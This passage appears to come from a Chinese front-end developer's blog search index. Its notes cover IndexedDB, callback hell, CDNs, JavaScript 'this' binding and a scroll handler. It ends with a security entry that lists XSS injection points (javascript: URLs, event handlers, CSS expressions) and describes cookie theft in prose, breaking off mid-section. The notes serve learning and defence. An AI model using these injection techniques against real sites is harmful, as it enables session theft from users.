class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.<span class="property">close</span></span><br></pre></td></tr></table></figure></li></ul></li></ol><h5 id="5.3-优点-与其他相比">5.3 优点 与其他相比<a title="#5.3-优点-与其他相比" href="#5.3-优点-与其他相比"></a></h5><ul><li>拥有更大的存储空间</li><li>能够处理更为复杂和结构化的数据</li><li>拥有更多的交互控制</li><li>每个 database 中可以拥有多个 database 和 table</li></ul><h5 id="5.4-局限性">5.4 局限性<a title="#5.4-局限性" href="#5.4-局限性"></a></h5><ul><li><strong>存储空间限制</strong>：一个单独的数据库项目大小没有限制，但可能会限制每个 IndexedDB 数据库的大小，不同浏览器有不同限制；</li><li><strong>兼容性问题</strong>：兼容性比前面提及的存储方案差</li><li><strong>受同源策略限制</strong>：把存储空间绑定到了创建它的站点的源，所以不能被其他源访问</li></ul>]]></content>
      
      
      <categories>
          
          <category> furtherNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> html5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>回调地狱及其解决方案</title>
      <link href="/furtherNotes/further/03%20%E5%9B%9E%E8%B0%83%E5%9C%B0%E7%8B%B1%E8%A7%A3%E5%86%B3"/>
      <url>/furtherNotes/further/03%20%E5%9B%9E%E8%B0%83%E5%9C%B0%E7%8B%B1%E8%A7%A3%E5%86%B3</url>
      
        <content type="html"><![CDATA[<blockquote><p>同步异步 promise 引申</p><p><a href="https://www.cnblogs.com/sonsmart/p/15265626.html">https://www.cnblogs.com/sonsmart/p/15265626.html</a></p></blockquote><h3 id="1.-回调地狱">1. 回调地狱<a title="#1.-回调地狱" href="#1.-回调地狱"></a></h3><h4 id="1.1-先导概念">1.1 先导概念<a title="#1.1-先导概念" href="#1.1-先导概念"></a></h4><p><strong>回调函数</strong>：当一个函数作为参数传入另一个参数中，其不会立即执行，只有当满足一定条件后该函数才可以执行，这种函数称为回调函数。</p><blockquote><p>其中定时器和ajax就存在回调函数</p></blockquote><blockquote><p>eg：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;执行回调函数&#x27;</span>);</span><br><span class="line">&#125;,<span class="number">3000</span>)</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123; ... &#125;</span><br><span class="line">xhr.<span class="title function_">open</span>(...);</span><br><span class="line">xhr.<span class="title function_">send</span>();</span><br></pre></td></tr></table></figure><p>上面的回调函数分别为：function(){ console.log() }、和onreadystatechange 绑定的函数，其中的执行条件分别为 3秒后 和 send发送请求并拿到响应后执行。</p></blockquote><p><strong>同步任务</strong>：在主线程上排队执行，只有前一个任务执行完毕，才能执行下一个任务。</p><p><strong>异步任务</strong>：不进入主线程，而是进入异步队列，前一个任务是否执行完毕不影响下一个任务的执行。</p><blockquote><p>eg：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;执行回调函数&#x27;</span>);</span><br><span class="line">&#125;,<span class="number">3000</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;111&#x27;</span>);</span><br></pre></td></tr></table></figure><p>这种不阻塞后面任务执行的任务就叫异步任务。</p></blockquote><h4 id="1.2-回调地狱">1.2 回调地狱<a title="#1.2-回调地狱" href="#1.2-回调地狱"></a></h4><p>— 为了在异步函数当中顺序执行代码而不断<strong>嵌套调用回调函数</strong></p><blockquote><p>eg：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;first&#x27;</span>);</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;sencond&#x27;</span>);</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;thrid&#x27;</span>)</span><br><span class="line">        &#125;,<span class="number">1000</span>)</span><br><span class="line">    &#125;,<span class="number">1000</span>)</span><br><span class="line">&#125;,<span class="number">1000</span>)</span><br></pre></td></tr></table></figure><p>这种回调函数中嵌套回调函数的情况就是回调地狱</p></blockquote><p>总结：**回调地狱就是为了实现代码顺序执行而出现的一种操作，**它会造成代码可读性差，后期不好维护。</p><h3 id="2.-如何解决回调地狱">2. 如何解决回调地狱<a title="#2.-如何解决回调地狱" href="#2.-如何解决回调地狱"></a></h3><ol><li>Promise：编写异步代码的一种方式，它仍然以自顶向下的方式执行，并且由于鼓励使用try / catch 样式错误处理而处理更多类型的错误</li><li>generators 生成器可以让你暂停单个函数，而不会暂停整个程序的状态，但代码稍微复杂一些，以使代码看起来像自上而下地执行</li><li>async / await 异步函数是一个建议的 es7 功能，将以更高级别的语法进一步包装生成器和承诺</li></ol><h4 id="2.1-promise">2.1 Promise<a title="#2.1-promise" href="#2.1-promise"></a></h4><h4 id="2.2-generators">2.2 Generators<a title="#2.2-generators" href="#2.2-generators"></a></h4><h4 id="2.3-async-/-await">2.3 async / await<a title="#2.3-async-/-await" href="#2.3-async-/-await"></a></h4>]]></content>
      
      
      <categories>
          
          <category> furtherNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> es6 </tag>
            
            <tag> promise </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CDN内容分发网络</title>
      <link href="/furtherNotes/further/08%20cdn"/>
      <url>/furtherNotes/further/08%20cdn</url>
      
        <content type="html"><![CDATA[<blockquote><p>由前端安全引申出的 cdn 的知识</p><p><a href="https://juejin.cn/post/6913704568325046279" target="_blank">cdn</a></p></blockquote><h4 id="4.1-简介">4.1 简介<a title="#4.1-简介" href="#4.1-简介"></a></h4><p>CDN ( Content Delivery Network )，内容分发网络（跟菜鸟的仓配网络一样）。</p><ul><li><p><strong>主要思路：</strong> 尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。</p></li><li><p><strong>实现方法：</strong> 通过在网络各处放置<strong>节点服务器</strong>所构成的在现有的互联网基础之上的一层<strong>智能虚拟网络</strong>，CDN系统能够实时地根据网络流量和各节点的<strong>连接和负载</strong>状况以及到用户的<strong>距离</strong>和<strong>响应时间</strong>等综合信息将用户的请求重新<strong>导向离用户最近的服务节点</strong>上，加快访问速度。</p></li><li><p><strong>目的：</strong> 使用户可<strong>就近</strong>取得所需内容，解决Internet网络拥挤的状况，提高用户访问网站的<strong>响应速度</strong>。</p></li><li><p><strong>优势：</strong></p><ol><li>CDN节点解决了跨运营商和跨地域访问的问题，访问延时大大降低；</li><li>大部分请求在CDN边缘节点完成，CDN起到了分流作用，减轻了源站的负载。</li></ol></li></ul><h4 id="4.2-组成">4.2 组成<a title="#4.2-组成" href="#4.2-组成"></a></h4><p>内容分发网络（CDN）是由多个节点组成的。一般来讲，CDN网络主要由<strong>中心节点</strong>、<strong>边缘节点</strong>两部分构成。</p><h5 id="4.2.1-中心节点">4.2.1 中心节点<a title="#4.2.1-中心节点" href="#4.2.1-中心节点"></a></h5><p>中心节点包括CDN网管中心和全局负载均衡DNS重定向解析系统，负责整个CDN网络的分发及管理</p><h5 id="4.2.2-边缘节点">4.2.2 边缘节点<a title="#4.2.2-边缘节点" href="#4.2.2-边缘节点"></a></h5><p>CDN边缘节点主要指异地分发节点，由<strong>负载均衡设备、高速缓存服务器</strong>两部分组成。</p><p><strong>负载均衡设备</strong>负责每个节点中各个Cache的负载均衡，保证节点的工作效率；同时还负责收集节点与周围环境的信息，保持与全局负载均衡DNS的通信，实现整个系统的负载均衡。</p><p><strong>高速缓存服务器</strong>（Cache）负责存储客户网站的大量信息，就像一个靠近用户的网站服务器一样响应本地用户的访问请求。通过全局负载均衡DNS的控制，用户的请求被透明地指向离他最近的节点，节点中Cache服务器就像网站的原始服务器一样，响应终端用户的请求。因其距离用户更近，故其响应时间才更快。</p><p><strong>中心节点就像仓配网络中负责货物调配的总仓，而边缘节点就是负责存储货物的各个城市的本地仓库。</strong></p><h4 id="4.3-基本工作流程">4.3 基本工作流程<a title="#4.3-基本工作流程" href="#4.3-基本工作流程"></a></h4><h5 id="4.3.1-传统方式">4.3.1 传统方式<a title="#4.3.1-传统方式" href="#4.3.1-传统方式"></a></h5><ol><li>用户在自己的浏览器中输入要访问的网站域名。</li><li>浏览器向 本地DNS服务器 请求对该域名的解析。</li><li>本地DNS服务器中如果缓存有这个域名的解析结果，则直接响应用户的解析请求。</li><li>本地DNS服务器中如果没有关于这个域名的解析结果的缓存，则以递归方式向整个DNS系统请求解析，获得应答后将结果反馈给浏览器。</li><li>浏览器得到域名解析结果，就是该域名相应的服务设备的 IP地址 。</li><li>浏览器向服务器请求内容。</li><li>服务器将用户请求内容传送给浏览器。</li></ol><p>当<strong>使用了CDN</strong>时，DNS 服务器根据用户 IP 地址，将域名解析成相应节点的缓存服务器IP地址，实现用户就近访问。使用 CDN 服务的网站，只需将其域名解析权交给 CDN 的全局负载均衡（GSLB）设备，将需要分发的内容注入 CDN，就可以实现内容加速了。</p><h5 id="4.3.2-cdn">4.3.2 CDN<a title="#4.3.2-cdn" href="#4.3.2-cdn"></a></h5><ol><li>当用户点击网址页面上的内容 URL，经过<strong>本地 DNS</strong> 系统解析，DNS 系统会最终将域名的解析权交给 <strong>CNAME</strong> 指向的 CDN 专用 DNS 服务器。</li><li>CDN 的 DNS 服务器将 CDN 的<strong>全局负载均衡设备</strong> IP 地址返回用户</li><li>用户向 CDN 的全局负载均衡设备发起内容 URL 访问请求</li><li>CDN 全局负载均衡设备根据用户 IP 地址，以及用户请求的内容 URL，选择一台<strong>用户所属区域的区域负载均衡设备</strong>，告诉用户向这太设备发起请求</li><li>基于以下这些条件的综合分析之后，区域负载均衡设备会<strong>向全局负载均衡设备返回</strong>一台缓存服务器的 IP 地址：<ul><li>根据用户 IP 地址，判断哪一台服务器距用户最近；</li><li>根据用户所请求的 URL 中携带的内容名称，判断哪一台服务器上有用户所需内容</li><li>查询各个服务器当前的负载请求，判断哪一台服务器尚有服务能能力</li></ul></li><li>全局负载均衡设备把服务器 IP 地址返回给用户</li><li>用户向<strong>缓存服务器</strong>发起请求，缓存服务器响应用户请求，将用户所需内容传送到用户终端。如果这台缓存服务器上并没有用户想要的内容，而区域均衡设备依然将它分配给了用户，那么这服务器就要向他的上一级缓存服务器请求内容，直至追溯到网站的源服务器将内容拉到本地。</li></ol><h4 id="4.4-作用">4.4 作用<a title="#4.4-作用" href="#4.4-作用"></a></h4><p>CDN 最常用的功能是<strong>加速</strong></p><ol><li><p><strong>加速访问</strong></p></li><li><p><strong>实现跨运营商、跨地域的全网覆盖</strong></p></li><li><p><strong>保障网络安全</strong></p><blockquote><p>CDN的负载均衡和分布式存储技术，可以加强网站的可靠性，相当无无形中给你的网站添加了一把保护伞，应对绝大部分的互联网攻击事件。防攻击系统也能避免网站遭到恶意攻击。</p></blockquote></li><li><p><strong>异地备援</strong></p></li><li><p><strong>节约成本</strong></p><blockquote><p>能克服<strong>网站分布不均</strong>的问题，投入使用CDN加速可以实现网站的全国铺设，你根据不用考虑购买服务器与后续的托管运维，服务器之间镜像同步，也不用为了管理维护技术人员而烦恼，并且能降低网站自身建设和维护成本。</p></blockquote></li><li><p><strong>让你更专注业务本身</strong></p><blockquote><p>CDN加速厂商一般都会提供一站式服务，业务不仅限于CDN，还有配套的云存储、大数据服务、视频云服务等，而且一般会提供7x24运维监控支持，保证网络随时畅通，你可以放心使用。并且将更多的精力投入到发展自身的核心业务之上。</p></blockquote></li></ol><h4 id="4.5-工作原理">4.5 工作原理<a title="#4.5-工作原理" href="#4.5-工作原理"></a></h4><p>基本原理是广泛采用各种缓存服务器，将这些缓存服务器分布到用户访问相对集中的地区或网络中，在用户访问网站时，利用全局负载技术将用户的访问指向距离最近的工作正常的缓存服务器上，由缓存服务器直接响应用户请求。</p><h5 id="4.5.1-用户访问cdn资源的过程">4.5.1 用户访问cdn资源的过程<a title="#4.5.1-用户访问cdn资源的过程" href="#4.5.1-用户访问cdn资源的过程"></a></h5><ol><li>用户向浏览器输入www.web.com这个域名，浏览器第一次发现本地没有DNS缓存，则向网站的DNS服务器请求；</li><li>网站的DNS域名解析器设置了CNAME，<a href="http://xn--www-0h9dk7wt9x.web.51cdn.com">指向了www.web.51cdn.com</a>,请求指向了CDN网络中的智能DNS负载均衡系统；</li><li>智能DNS负载均衡系统解析域名，把对用户响应速度最快的IP节点（CDN服务器）返回给用户；</li><li>用户向该IP节点（CDN服务器）发出请求；</li><li>由于是第一次访问，CDN服务器会向原web站点请求，并缓存内容；</li><li>请求结果发给用户。</li></ol><h5 id="4.5.2-cdn主要特点">4.5.2 cdn主要特点<a title="#4.5.2-cdn主要特点" href="#4.5.2-cdn主要特点"></a></h5><ol><li><strong>本地Cache加速</strong> 提高了企业站点（尤其含有大量图片和静态页面站点）的访问速度，并大大提高以上性质站点的稳定性</li><li><strong>镜像服务</strong> 消除了不同运营商之间互联的瓶颈造成的影响，实现了跨运营商的网络加速，保证不同网络中的用户都能得到良好的访问质量。</li><li><strong>远程加速</strong> 远程访问用户根据DNS负载均衡技术智能自动选择Cache服务器，选择最快的Cache服务器，加快远程访问的速度</li><li><strong>带宽优化</strong> 自动生成服务器的远程Mirror（镜像）cache服务器，远程用户访问时从cache服务器上读取数据，减少远程访问的带宽、分担网络流量、减轻原站点WEB服务器负载等功能。</li><li><strong>集群抗攻击</strong> 广泛分布的CDN节点加上节点之间的智能冗余机制，可以有效地预防黑客入侵以及降低各种D.D.o.S攻击对网站的影响，同时保证较好的服务质量 。</li></ol><h4 id="4.6-对网络的优化">4.6 对网络的优化<a title="#4.6-对网络的优化" href="#4.6-对网络的优化"></a></h4><ol><li>解决服务器端的 “ 第一公里 ”问题</li><li>缓解甚至消除了不同运营商之间互联的瓶颈造成的影响</li><li>减轻了各省的出口带宽压力</li><li>缓解了骨干网的压力</li><li>优化了网上热点内容的分布</li></ol><p>**第一公里：**指万维网流量向用户传送的第一个出口，是网站服务器接入互联网的链路所能提供的带宽。这个带宽决定了一个网站能为用户提供的访问速度和并发访问量。如果业务繁忙，用户的访问数越多，拥塞越严重，网站会在最需要向用户提供服务时失去用户。</p><p>**中间一公里：**代表互联网中节点与节点之间的传输网络</p><p>**最后一公里：**万维网流量向用户传送的最后一段接入链路</p><h4 id="4.7-应用场景">4.7 应用场景<a title="#4.7-应用场景" href="#4.7-应用场景"></a></h4><ol><li>网站站点 / 应用加速</li><li>视音频点播 / 大文件下载分发加速</li><li>视频直播加速</li><li>移动应用加速</li></ol>]]></content>
      
      
      <categories>
          
          <category> furtherNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>节流throttle、防抖debounce</title>
      <link href="/furtherNotes/further/06%20this%E6%8C%87%E5%90%91%20call%20bind%20apply"/>
      <url>/furtherNotes/further/06%20this%E6%8C%87%E5%90%91%20call%20bind%20apply</url>
      
        <content type="html"><![CDATA[<h2 id="call、bind、apply、this">call、bind、apply、this<a title="#call、bind、apply、this" href="#call、bind、apply、this"></a></h2><h3 id="1.-this-指向">1. this 指向<a title="#1.-this-指向" href="#1.-this-指向"></a></h3><p><strong><font color='red'>this 永远指向最后调用它的那个对象</font></strong>（执行时）</p><p><strong>匿名函数的 this 永远指向 window</strong></p><blockquote><p>非严格模式 全局对象 window</p><p>严格模式 全局对象是 undefined</p></blockquote><h3 id="2.-改变-this-指向">2. 改变 this 指向<a title="#2.-改变-this-指向" href="#2.-改变-this-指向"></a></h3><ul><li>使用箭头函数</li><li>函数内部使用 <code>_this = this</code></li><li>使用 <code>apply</code>、<code>call</code>、<code>bind</code></li><li><code>new</code> 实例化对象</li></ul><h4 id="2.1-箭头函数">2.1 箭头函数<a title="#2.1-箭头函数" href="#2.1-箭头函数"></a></h4><p><strong>箭头函数的 this 始终指向函数定义时的 this，而非执行时。</strong></p><p>箭头函数中没有 this 绑定，必须通过查找作用域链来决定其值，如果箭头函数被非箭头函数包含，则 this 绑定的是最近一层非箭头函数的 this，否则 undefined。</p><h4 id="2.2-_this-=-this">2.2 _this = this<a title="#2.2-_this-=-this" href="#2.2-_this-=-this"></a></h4><p>相当于把 this 的值 保存在另一个变量 _this</p><h4 id="2.3-&lt;font-color='red'&gt;apply、call、bind&lt;/font&gt;">2.3 <font color='red'>apply、call、bind</font><a title="#2.3-&lt;font-color='red'&gt;apply、call、bind&lt;/font&gt;" href="#2.3-&lt;font-color='red'&gt;apply、call、bind&lt;/font&gt;"></a></h4><h5 id="2.3.1-apply">2.3.1 apply<a title="#2.3.1-apply" href="#2.3.1-apply"></a></h5><p>apply() 方法调用一个函数，其具有一个指定的 this 值，以及 作为一个数组（类数组对象）通过的参数</p><p><code>func.apply(thisArg, [argsArray])</code></p><ul><li><p>thisArg：在 func 函数运行时指定的 this 值。</p><blockquote><p>注：指定的 this 值并不一定是该函数执行时真正的 this 值，<strong>如果函数处于非严格模式下，则指定为 null 或 undefined 会自动指向全局对象，值为原始值的 this 会指向该原始值的自动包装对象。</strong></p></blockquote></li><li><p>argsArrays：一个数组或者类数组对象，其中的数组元素将作为单独的参数传给 fun 函数。</p><blockquote><p>如果该参数的值为 null 或 undefined，则表示不需要传入任何参数。</p></blockquote></li></ul><h5 id="2.3.2-call">2.3.2 call<a title="#2.3.2-call" href="#2.3.2-call"></a></h5><p>call 与 apply 基本类似，只有传入参数的不同</p><p><code>func.call(thisArg[, arg1[, arg2...]])</code></p><ul><li>call 接收的 若干个参数列表     <code>b.call(a, 1, 2)</code></li><li>apply 接收 一个包含多个参数的数组  <code>b.apply(a, [1,2])</code></li></ul><h5 id="2.3.3-bind">2.3.3 bind<a title="#2.3.3-bind" href="#2.3.3-bind"></a></h5><p>bind() 方法<strong>创建一个新的函数</strong>，所以需要被调用。</p><p><code>b.bind(a, 1, 2)()</code></p><h4 id="2.4-函数调用">2.4 函数调用<a title="#2.4-函数调用" href="#2.4-函数调用"></a></h4><p>方法种类：</p><ol><li><p>作为一个函数被调用</p><blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>)&#123;...&#125;</span><br><span class="line"><span class="title function_">a</span>();</span><br></pre></td></tr></table></figure></blockquote></li><li><p>作为对象的方法被调用</p><blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = &#123; fn : <span class="keyword">function</span>(<span class="params"></span>)&#123; ... &#125; &#125;;</span><br><span class="line">a.<span class="title function_">fn</span>();</span><br></pre></td></tr></table></figure></blockquote></li><li><p>使用构造函数调用函数</p><blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">func</span>(<span class="params">arg</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = arg;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> a = <span class="keyword">new</span> <span class="title function_">func</span>(<span class="number">18</span>)</span><br><span class="line">a.<span class="property">age</span>;</span><br></pre></td></tr></table></figure></blockquote></li><li><p>作为函数方法调用函数（ call、apply）</p><blockquote><p>在 js 中，函数是对象。</p><p>js 函数有自己的属性和方法，其中 call() 和 apply() 是预定义的函数方法，</p><p>其可用于调用函数，两个方法的第一个参数必须是对象本事。</p><p>在 严格模式，调用函数时 第一个参数会成为 this 的值，即使该参数不是一个对象</p><p>在非严格模式，如果第一参数是 null / undefined，将使用全局对象替代</p></blockquote></li></ol>]]></content>
      
      
      <categories>
          
          <category> furtherNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>触底事件</title>
      <link href="/furtherNotes/further/07%20%E6%BB%9A%E5%8A%A8%E6%9D%A1%E8%A7%A6%E5%BA%95%E4%BA%8B%E4%BB%B6"/>
      <url>/furtherNotes/further/07%20%E6%BB%9A%E5%8A%A8%E6%9D%A1%E8%A7%A6%E5%BA%95%E4%BA%8B%E4%BB%B6</url>
      
        <content type="html"><![CDATA[<p>判断是否到达页面底部</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="variable language_">window</span>).<span class="title function_">scroll</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;  </span><br><span class="line"><span class="keyword">if</span> ($(<span class="string">&#x27;html, body&#x27;</span>).<span class="title function_">scrollTop</span>() + <span class="variable language_">window</span>.<span class="property">innerHeight</span> &gt;= <span class="title class_">Math</span>.<span class="title function_">floor</span>($(<span class="string">&#x27;html&#x27;</span>).<span class="title function_">outerHeight</span>(<span class="literal">true</span>))) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable constant_">PART</span> == <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="title function_">loadingNextPART1</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable constant_">PART</span> == <span class="number">2</span>) &#123;</span><br><span class="line">      <span class="title function_">loadingNextPART2</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;）</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> furtherNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于网络攻击那些事儿~</title>
      <link href="/furtherNotes/further/08%20%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8"/>
      <url>/furtherNotes/further/08%20%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8</url>
      
        <content type="html"><![CDATA[<blockquote><p>参考链接：</p><p><a href="https://blog.poetries.top/browser-working-principle/guide/part6/lesson33.html" target="_blank">xss</a> <a href="https://juejin.cn/post/6844903685122703367" target="_blank">xss</a></p><p><a href="https://blog.poetries.top/browser-working-principle/guide/part6/lesson34.htm" target="_blank">csrf</a>  <a href="https://juejin.cn/post/6844903465634758669" target="_blank">csrf</a>  <a href="https://juejin.cn/post/6844903689702866952" target="_blank">csrf</a></p><p><a href="https://zhuanlan.zhihu.com/p/112894574" target="_blank">ddos</a></p><p><a href="https://juejin.cn/post/6844903757919027208" target="_blank">cdn</a></p><p><a href="https://www.cnblogs.com/lovesong/p/5248483.html" target="_blank">点击劫持</a>  <a href="https://www.jianshu.com/p/251704d8ff18" target="_blank">点击劫持</a>  <a href="https://zhuanlan.zhihu.com/p/53197562" target="_blank">点击劫持</a></p><p><a href="https://zhuanlan.zhihu.com/p/25537440" target="_blank">HTST</a></p><p><a href="https://zhuanlan.zhihu.com/p/83865185" target="_blank">前端安全</a></p></blockquote><h2 id="前端安全">前端安全<a title="#前端安全" href="#前端安全"></a></h2><blockquote><ol><li>XSS</li><li>CSRF</li><li>DDoS</li><li>CDN 劫持</li><li>iframe</li><li>opener</li><li>ClickJacking 点击劫持</li><li>HSTS（HTTP严格传输安全）</li><li>泛洪</li></ol></blockquote><h3 id="1.-xss攻击-—-跨站脚本攻击">1. XSS攻击 — 跨站脚本攻击<a title="#1.-xss攻击-—-跨站脚本攻击" href="#1.-xss攻击-—-跨站脚本攻击"></a></h3><h4 id="1.1-简介">1.1 简介<a title="#1.1-简介" href="#1.1-简介"></a></h4><p>XSS 全称是 Cross Site Scripting，为了与“CSS”区分开来，故简称 XSS，翻译过来就是“跨站脚本”。XSS 攻击是指黑客往 HTML 文件中或者 DOM 中注入恶意脚本，从而在用户浏览页面时利用注入的恶意脚本对用户实施攻击的一种手段。</p><p>本质是：恶意代码未经过滤，与网站正常的代码混在一起；浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行</p><h4 id="1.2-攻击的危害">1.2 攻击的危害<a title="#1.2-攻击的危害" href="#1.2-攻击的危害"></a></h4><ul><li>可以窃取 Cookie 信息。恶意 JavaScript 可以通过“document.cookie”获取 Cookie 信息，然后通过 XMLHttpRequest 或者 Fetch 加上 CORS 功能将数据发送给恶意服务器；恶意服务器拿到用户的 Cookie 信息之后，就可以在其他电脑上模拟用户的登录，然后进行转账等操作。</li><li>可以监听用户行为。恶意 JavaScript 可以使用“addEventListener”接口来监听键盘事件，比如可以获取用户输入的信用卡等信息，将其发送到恶意服务器。黑客掌握了这些信息之后，又可以做很多违法的事情。</li><li>可以通过修改 DOM伪造假的登录窗口，用来欺骗用户输入用户名和密码等信息。</li><li>还可以在页面内生成浮窗广告，这些广告会严重地影响用户体验。</li></ul><h4 id="1.3-注入方式">1.3 注入方式<a title="#1.3-注入方式" href="#1.3-注入方式"></a></h4><ul><li>在 html 中内嵌的文本中，恶意内容以 script 标签形式注入；</li><li>在内联的 javascript 中，拼接的数据突破了原本的限制（字符串、变量、方法名等）</li><li>在标签属性中，恶意内容包含引号，突破属性值的限制，注入其他属性或标签；</li><li>在标签的href、src等属性中，包含 javascript: 等可执行代码；</li><li>在 onload、onerror、onclick 等事件中，注入不受控制代码；</li><li>在 style 属性和标签中，包含类似 <code>background-image:url(‘javascript : ...’);</code>的代码</li><li>在 style 属性和标签中，包含类似 <code>expression(...)</code> 的css表达式代码</li></ul><p>总之，如果开发者没有将用户输入的文本进行合适的过滤，就贸然插入到 html 中，这很容易造成注入漏洞。攻击者可以利用漏洞，构造成恶意的代码指令，进而利用恶意代码危害数据安全。</p><h4 id="1.3-分类">1.3 分类<a title="#1.3-分类" href="#1.3-分类"></a></h4><h5 id="1.3.1存储型-xss-攻击">1.3.1<strong>存储型 XSS 攻击</strong><a title="#1.3.1存储型-xss-攻击" href="#1.3.1存储型-xss-攻击"></a></h5><p>在表单输入一段 脚本，然后这段脚本会存在数据库里，每当其他用户从数据库拿到数据渲染到页面上时，会有这一段脚本存在，当用户触发后，自己的数据就会被发送到非法服务器。</p><blockquote><ul><li>攻击者将恶意代码<strong>提交到目标网站的数据库</strong>中。</li><li>用户<strong>打开目标网站</strong>时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。</li><li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</li><li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li></ul><p>这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。</p></blockquote><h5 id="1.3.2-反射型-xss-攻击">1.3.2 <strong>反射型 XSS 攻击</strong><a title="#1.3.2-反射型-xss-攻击" href="#1.3.2-反射型-xss-攻击"></a></h5><p>url 里面 放 脚本，发送请求，该请求的 查询字符串会被作为 dom 节点的 内容 放到html里执行，黑客就可以利用该脚本做一些恶意操作。</p><blockquote><ol><li>攻击者<strong>构造出特殊的 URL</strong>，其中包含恶意代码。</li><li>用户<strong>打开带有恶意代码的 URL 时</strong>，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。</li><li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</li><li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li></ol><p>反射型 XSS 跟存储型 XSS 的<strong>区别</strong>是：存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里。</p><p>反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。</p><p>由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。</p><p>POST 的内容也可以触发反射型 XSS，只不过其触发条件比较苛刻（需要构造表单提交页面，并引导用户点击），所以非常少见。</p></blockquote><h5 id="1.3.3-基于-dom-的-xss-攻击">1.3.3 <strong>基于 DOM 的 XSS 攻击</strong><a title="#1.3.3-基于-dom-的-xss-攻击" href="#1.3.3-基于-dom-的-xss-攻击"></a></h5><p>跟 web 服务器没有关系</p><blockquote><ol><li>攻击者构造出特殊的 URL，其中包含恶意代码。</li><li>用户打开带有恶意代码的 